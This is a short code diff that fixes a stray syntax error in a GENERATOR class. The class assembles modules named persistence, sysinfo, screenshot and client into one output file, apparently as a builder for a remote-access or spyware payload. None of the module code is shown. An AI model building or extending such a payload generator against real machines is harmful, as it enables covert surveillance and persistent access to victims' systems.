@@ -680,7 +680,7 @@ class GENERATOR:
         pull.print("File: " + self.output)
     
     def generate(self):
-        time.sleep(2)[]
+        time.sleep(2)
         pull.function("compiling modules......")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
